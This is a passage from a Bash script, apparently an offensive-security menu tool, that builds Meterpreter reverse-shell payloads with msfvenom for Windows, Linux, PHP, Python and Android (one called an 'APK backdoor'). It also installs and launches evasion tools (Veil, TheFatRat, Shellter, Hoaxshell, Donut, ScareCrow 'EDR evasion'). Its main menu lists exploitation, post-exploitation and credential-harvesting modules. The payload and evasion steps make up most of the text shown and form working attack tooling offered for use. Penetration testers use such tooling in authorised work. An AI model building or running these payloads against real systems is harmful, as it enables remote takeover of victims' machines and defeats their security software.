                    echo -e "${BRIGHT_BLUE}[6]${RESET} List all payloads"
                    echo -e "${BRIGHT_BLUE}[7]${RESET} Custom payload"
                    read -rp "Select option: " msf_choice
                    case $msf_choice in
                        1)
                            read -rp "Enter LHOST (your IP): " lhost
                            read -rp "Enter LPORT (default 4444): " lport
                            lport=${lport:-4444}
                            read -rp "Output filename (default: payload.exe): " output
                            output=${output:-payload.exe}
                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Generating Windows reverse shell...\n"
                            msfvenom -p windows/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f exe -o "$output"
                            echo -e "\n${BRIGHT_GREEN}[✓]${RESET} Payload saved to: $output\n"
                            ;;
                        2)
                            read -rp "Enter LHOST (your IP): " lhost
                            read -rp "Enter LPORT (default 4444): " lport
                            lport=${lport:-4444}
                            read -rp "Output filename (default: payload.elf): " output
                            output=${output:-payload.elf}
                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Generating Linux reverse shell...\n"
                            msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f elf -o "$output"
                            chmod +x "$output"
                            echo -e "\n${BRIGHT_GREEN}[✓]${RESET} Payload saved to: $output\n"
                            ;;
                        3)
                            read -rp "Enter LHOST (your IP): " lhost
                            read -rp "Enter LPORT (default 4444): " lport
                            lport=${lport:-4444}
                            read -rp "Output filename (default: payload.php): " output
                            output=${output:-payload.php}
                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Generating PHP reverse shell...\n"
                            msfvenom -p php/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f raw -o "$output"
                            echo -e "\n${BRIGHT_GREEN}[✓]${RESET} Payload saved to: $output\n"
                            ;;
                        4)
                            read -rp "Enter LHOST (your IP): " lhost
                            read -rp "Enter LPORT (default 4444): " lport
                            lport=${lport:-4444}
                            read -rp "Output filename (default: payload.py): " output
                            output=${output:-payload.py}
                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Generating Python reverse shell...\n"
                            msfvenom -p python/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f raw -o "$output"
                            echo -e "\n${BRIGHT_GREEN}[✓]${RESET} Payload saved to: $output\n"
                            ;;
                        5)
                            read -rp "Enter LHOST (your IP): " lhost
                            read -rp "Enter LPORT (default 4444): " lport
                            lport=${lport:-4444}
                            read -rp "Output filename (default: payload.apk): " output
                            output=${output:-payload.apk}
                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Generating Android APK backdoor...\n"
                            msfvenom -p android/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -o "$output"
                            echo -e "\n${BRIGHT_GREEN}[✓]${RESET} Payload saved to: $output\n"
                            ;;
                        6)
                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Available payloads:\n"
                            msfvenom --list payloads | less
                            ;;
                        7)
                            read -rp "Enter payload (e.g., windows/shell/reverse_tcp): " payload
                            read -rp "Enter LHOST: " lhost
                            read -rp "Enter LPORT: " lport
                            read -rp "Enter format (exe, elf, raw, etc.): " format
                            read -rp "Output filename: " output
                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Generating custom payload...\n"
                            msfvenom -p "$payload" LHOST="$lhost" LPORT="$lport" -f "$format" -o "$output"
                            echo -e "\n${BRIGHT_GREEN}[✓]${RESET} Payload saved to: $output\n"
                            ;;
                    esac
                fi
                ;;
            2)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking Veil-Framework...\n"
                if [ ! -d ~/tools/Veil ]; then
                    echo -e "${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}Veil is not installed.${RESET}"
                    read -rp "Would you like to install it from GitHub? (yes/no): " install_choice
                    if [[ $install_choice =~ ^[Yy]([Ee][Ss])?$ ]]; then
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Cloning Veil from GitHub...\n"
                        mkdir -p ~/tools
                        git clone https://github.com/Veil-Framework/Veil.git ~/tools/Veil
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Installing Veil (this may take a while)...\n"
                        cd ~/tools/Veil
                        sudo ./config/setup.sh --force --silent
                        cd -
                    fi
                fi
                if [ -d ~/tools/Veil ]; then
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} Launching Veil-Evasion...\n"
                    cd ~/tools/Veil
                    ./Veil.py
                    cd -
                fi
                ;;
            3)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking TheFatRat...\n"
                if [ ! -d ~/tools/TheFatRat ]; then
                    echo -e "${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}TheFatRat is not installed.${RESET}"
                    read -rp "Would you like to install it from GitHub? (yes/no): " install_choice
                    if [[ $install_choice =~ ^[Yy]([Ee][Ss])?$ ]]; then
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Cloning TheFatRat from GitHub...\n"
                        mkdir -p ~/tools
                        git clone https://github.com/screetsec/TheFatRat.git ~/tools/TheFatRat
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Installing TheFatRat...\n"
                        cd ~/tools/TheFatRat
                        chmod +x setup.sh
                        sudo ./setup.sh
                        cd -
                    fi
                fi
                if [ -d ~/tools/TheFatRat ]; then
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} Launching TheFatRat...\n"
                    cd ~/tools/TheFatRat
                    ./fatrat
                    cd -
                fi
                ;;
            4)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking Shellter...\n"
                if ! command -v shellter &> /dev/null; then
                    echo -e "${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}Shellter is not installed.${RESET}"
                    read -rp "Would you like to install it? (yes/no): " install_choice
                    if [[ $install_choice =~ ^[Yy]([Ee][Ss])?$ ]]; then
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Installing Shellter...\n"
                        sudo apt-get update
                        sudo apt-get install -y shellter
                    fi
                fi
                if command -v shellter &> /dev/null; then
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} Shellter PE Injection:\n"
                    echo -e "${BRIGHT_BLUE}Note: Shellter requires Windows PE files${RESET}"
                    echo -e "${BRIGHT_BLUE}Run 'shellter' and follow interactive prompts${RESET}\n"
                    read -rp "Launch Shellter? (yes/no): " launch
                    if [[ $launch =~ ^[Yy]([Ee][Ss])?$ ]]; then
                        shellter
                    fi
                fi
                ;;
            5)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking Hoaxshell...\n"
                if [ ! -d ~/tools/hoaxshell ]; then
                    echo -e "${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}Hoaxshell is not installed.${RESET}"
                    read -rp "Would you like to install it from GitHub? (yes/no): " install_choice
                    if [[ $install_choice =~ ^[Yy]([Ee][Ss])?$ ]]; then
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Cloning Hoaxshell from GitHub...\n"
                        mkdir -p ~/tools
                        git clone https://github.com/t3l3machus/hoaxshell.git ~/tools/hoaxshell
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Installing dependencies...\n"
                        pip3 install -r ~/tools/hoaxshell/requirements.txt
                    fi
                fi
                if [ -d ~/tools/hoaxshell ]; then
                    read -rp "Enter your IP (LHOST): " lhost
                    read -rp "Enter port (default 8080): " lport
                    lport=${lport:-8080}
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} Starting Hoaxshell server...\n"
                    echo -e "${BRIGHT_BLUE}Server will generate PowerShell payload${RESET}\n"
                    cd ~/tools/hoaxshell
                    python3 hoaxshell.py -s "$lhost" -p "$lport"
                    cd -
                fi
                ;;
            6)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking Donut...\n"
                if ! command -v donut &> /dev/null && [ ! -f ~/tools/donut/donut ]; then
                    echo -e "${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}Donut is not installed.${RESET}"
                    read -rp "Would you like to install it from GitHub? (yes/no): " install_choice
                    if [[ $install_choice =~ ^[Yy]([Ee][Ss])?$ ]]; then
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Cloning Donut from GitHub...\n"
                        mkdir -p ~/tools
                        git clone https://github.com/TheWover/donut.git ~/tools/donut
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Building Donut...\n"
                        cd ~/tools/donut
                        make
                        sudo make install
                        cd -
                    fi
                fi
                if command -v donut &> /dev/null || [ -f ~/tools/donut/donut ]; then
                    DONUT_CMD=$(command -v donut || echo ~/tools/donut/donut)
                    read -rp "Enter .NET EXE/DLL file path: " input_file
                    read -rp "Output shellcode file (default: payload.bin): " output
                    output=${output:-payload.bin}
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} Converting to shellcode...\n"
                    $DONUT_CMD -f "$input_file" -o "$output"
                    echo -e "\n${BRIGHT_GREEN}[✓]${RESET} Shellcode saved to: $output\n"
                fi
                ;;
            7)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking ScareCrow...\n"
                if ! command -v ScareCrow &> /dev/null; then
                    echo -e "${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}ScareCrow is not installed.${RESET}"
                    read -rp "Would you like to install it from GitHub? (yes/no): " install_choice
                    if [[ $install_choice =~ ^[Yy]([Ee][Ss])?$ ]]; then
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Installing ScareCrow...\n"
                        if ! command -v go &> /dev/null; then
                            echo -e "${BRIGHT_RED}[!]${RESET} Go is required. Installing...\n"
                            sudo apt-get install -y golang-go
                        fi
                        go install github.com/optiv/ScareCrow@latest
                        export PATH=$PATH:~/go/bin
                    fi
                fi
                if command -v ScareCrow &> /dev/null || [ -f ~/go/bin/ScareCrow ]; then
                    SCARECROW_CMD=$(command -v ScareCrow || echo ~/go/bin/ScareCrow)
                    read -rp "Enter shellcode file path: " shellcode
                    read -rp "Enter domain for signing (optional): " domain
                    read -rp "Output filename (default: payload.exe): " output
                    output=${output:-payload.exe}
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} Generating EDR evasion payload...\n"
                    if [ -z "$domain" ]; then
                        $SCARECROW_CMD -I "$shellcode" -O "$output"
                    else
                        $SCARECROW_CMD -I "$shellcode" -domain "$domain" -O "$output"
                    fi
                    echo -e "\n${BRIGHT_GREEN}[✓]${RESET} Payload saved to: $output\n"
                fi
                ;;
            99)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Returning to Main Menu...\n"
                sleep 1
                clear
                return
                ;;
            *)
                echo -e "\n${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}Invalid selection${RESET}\n"
                sleep 1
                clear
                ;;
        esac
        
        echo ""
        read -rp "${BRIGHT_BLUE}Press Enter to continue...${RESET}"
        clear
        return
    done
}


#MAIN SELECTION HANDLER

handle_selection() {
    case $1 in
        1)
            echo -e "\n${BRIGHT_RED}[◆]${RESET} Initializing NETWORK RECONNAISSANCE...\n"
            sleep 1
            network_reconnaissance_menu
            ;;
        2)
            echo -e "\n${BRIGHT_RED}[◆]${RESET} Launching VULNERABILITY SCANNER...\n"
            sleep 1
            vulnerability_menu
            ;;
        3)
            echo -e "\n${BRIGHT_RED}[◆]${RESET} Loading EXPLOITATION FRAMEWORK...\n"
            sleep 1
            exploitation_menu
            ;;
        4)
            echo -e "\n${BRIGHT_RED}[◆]${RESET} Activating POST-EXPLOITATION modules...\n"
            sleep 1
            postexploitation_menu
            ;;
        5)
            echo -e "\n${BRIGHT_RED}[◆]${RESET} Starting CREDENTIAL HARVESTER...\n"
            sleep 1
            credential_menu
            ;;
        6)
            echo -e "\n${BRIGHT_RED}[◆]${RESET} Generating PAYLOAD...\n"
            payload_menu
            sleep 1
            ;;
        7)
            echo -e "\n${BRIGHT_RED}[◆] SYSTEM SHUTDOWN${RESET}\n"
            echo -e "${BRIGHT_BLUE}Closing connection...${RESET}\n"
            sleep 1
            clear
            exit 0
            ;;
        *)
            echo -e "\n${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}Invalid selection${RESET}\n"
            sleep 1
            clear
            ;;
    esac
}


Main_Loop(){
    # Main loop
    clear
    while true; do
    display_ascii_info
    display_menu
    read -rp " ${BRIGHT_BLUE}user@nexus:~${RESET}${BRIGHT_RED}\$${RESET} " choice
    handle_selection "$choice"
done
}

Main_Loop